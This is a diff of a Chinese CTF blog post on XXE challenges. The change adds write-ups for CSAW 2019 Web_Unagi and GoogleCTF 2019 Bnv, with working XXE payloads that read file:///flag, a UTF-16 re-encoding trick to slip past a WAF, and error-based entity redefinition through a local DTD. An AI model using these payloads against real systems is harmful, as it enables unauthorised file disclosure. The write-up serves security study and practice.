@@ -82,20 +82,20 @@
 
 
 
-<meta name="description" content="SecurinetsCTF-2019 feedback 进入页面。 然后随便发一点什么东西试一试：  而且在网页的源代码中可以在&amp;lt;head&amp;gt;中找到以下脚本： 123456789101112131415161718192021&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;function func()&amp;#123;    var xml =">
+<meta name="description" content="CSAWQual 2019 Web_Unagi 让我们上传xml文件并查看, 使用常规类型来读取发现被waf拦截, 根据wp转utf16绕过 1cat x.xml | iconv -f UTF-8 -t UTF-16BE &amp;gt; x16.xml 123456789101112131415161718192021&amp;lt;?xml version=&apos;1.0&apos;?&amp;gt;&amp;lt;!DOCTYPE use">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XXE 题型记录[working forever]">
 <meta property="og:url" content="http://yoursite.com/2019/04/22/XXE题型记录/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="SecurinetsCTF-2019 feedback 进入页面。 然后随便发一点什么东西试一试：  而且在网页的源代码中可以在&amp;lt;head&amp;gt;中找到以下脚本： 123456789101112131415161718192021&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;function func()&amp;#123;    var xml =">
+<meta property="og:description" content="CSAWQual 2019 Web_Unagi 让我们上传xml文件并查看, 使用常规类型来读取发现被waf拦截, 根据wp转utf16绕过 1cat x.xml | iconv -f UTF-8 -t UTF-16BE &amp;gt; x16.xml 123456789101112131415161718192021&amp;lt;?xml version=&apos;1.0&apos;?&amp;gt;&amp;lt;!DOCTYPE use">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/54907627-f3d6d000-4f20-11e9-860d-e967349bb159.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/54907916-ab6be200-4f21-11e9-9471-bff46378d15d.png">
-<meta property="og:updated_time" content="2019-12-28T18:11:39.070Z">
+<meta property="og:updated_time" content="2020-01-13T14:27:05.839Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XXE 题型记录[working forever]">
-<meta name="twitter:description" content="SecurinetsCTF-2019 feedback 进入页面。 然后随便发一点什么东西试一试：  而且在网页的源代码中可以在&amp;lt;head&amp;gt;中找到以下脚本： 123456789101112131415161718192021&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;function func()&amp;#123;    var xml =">
+<meta name="twitter:description" content="CSAWQual 2019 Web_Unagi 让我们上传xml文件并查看, 使用常规类型来读取发现被waf拦截, 根据wp转utf16绕过 1cat x.xml | iconv -f UTF-8 -t UTF-16BE &amp;gt; x16.xml 123456789101112131415161718192021&amp;lt;?xml version=&apos;1.0&apos;?&amp;gt;&amp;lt;!DOCTYPE use">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/54907627-f3d6d000-4f20-11e9-860d-e967349bb159.png">
 
 
@@ -167,7 +167,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">别浪费时间了,这里没什么值得你看的东西</p>
+        <p class="site-subtitle">要温柔而强大ヾ(≧▽≦*)o</p>
       
   </div>
 
@@ -336,8 +336,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-12-29T02:11:39+08:00">
-                2019-12-29
+              <time title="Post modified" itemprop="dateModified" datetime="2020-01-13T22:27:05+08:00">
+                2020-01-13
               </time>
             
           </span>
@@ -386,7 +386,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  258
+                  544
                 </span>
               
 
@@ -402,7 +402,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  1
+                  2
                 </span>
               
             </div>
@@ -423,7 +423,15 @@
       
 
       
-        <h2 id="SecurinetsCTF-2019-feedback">SecurinetsCTF-2019 feedback</h2>
+        <h2 id="CSAWQual-2019-Web-Unagi">CSAWQual 2019 Web_Unagi</h2>
+<p>让我们上传xml文件并查看, 使用常规类型来读取发现被waf拦截, 根据wp转utf16绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat x.xml | iconv -f UTF-8 -t UTF-16BE &gt; x16.xml</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0'?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE users [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///flag" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>gg<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>ggg<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intro</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intro</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="GoogleCTF2019-Quals-Bnv">GoogleCTF2019 Quals Bnv</h2>
+<p>翻翻源码知道了这是一个xxe</p>
+<p>引用外部dtd文件并重新定义参数实体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ETITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="SecurinetsCTF-2019-feedback">SecurinetsCTF-2019 feedback</h2>
 <p>进入页面。<br>
 然后随便发一点什么东西试一试：<br>
 <img src="https://user-images.githubusercontent.com/40637063/54907627-f3d6d000-4f20-11e9-860d-e967349bb159.png" alt></p>
@@ -458,8 +466,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/22/代码审计题型/" rel="next" title="代码审计 题型记录">
-                <i class="fa fa-chevron-left"></i> 代码审计 题型记录
+              <a href="/2019/04/22/代码审计题型/" rel="next" title="代码审计 题型记录[working forever]">
+                <i class="fa fa-chevron-left"></i> 代码审计 题型记录[working forever]
               </a>
             
           </div>
@@ -549,7 +557,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-count">39</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -641,7 +649,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SecurinetsCTF-2019-feedback"><span class="nav-number">1.</span> <span class="nav-text">SecurinetsCTF-2019 feedback</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CSAWQual-2019-Web-Unagi"><span class="nav-number">1.</span> <span class="nav-text">CSAWQual 2019 Web_Unagi</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GoogleCTF2019-Quals-Bnv"><span class="nav-number">2.</span> <span class="nav-text">GoogleCTF2019 Quals Bnv</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SecurinetsCTF-2019-feedback"><span class="nav-number">3.</span> <span class="nav-text">SecurinetsCTF-2019 feedback</span></a></li></ol></div>
             
 
           </div>
@@ -675,7 +683,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">65k</span>
+    <span title="Site words total count">67.8k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
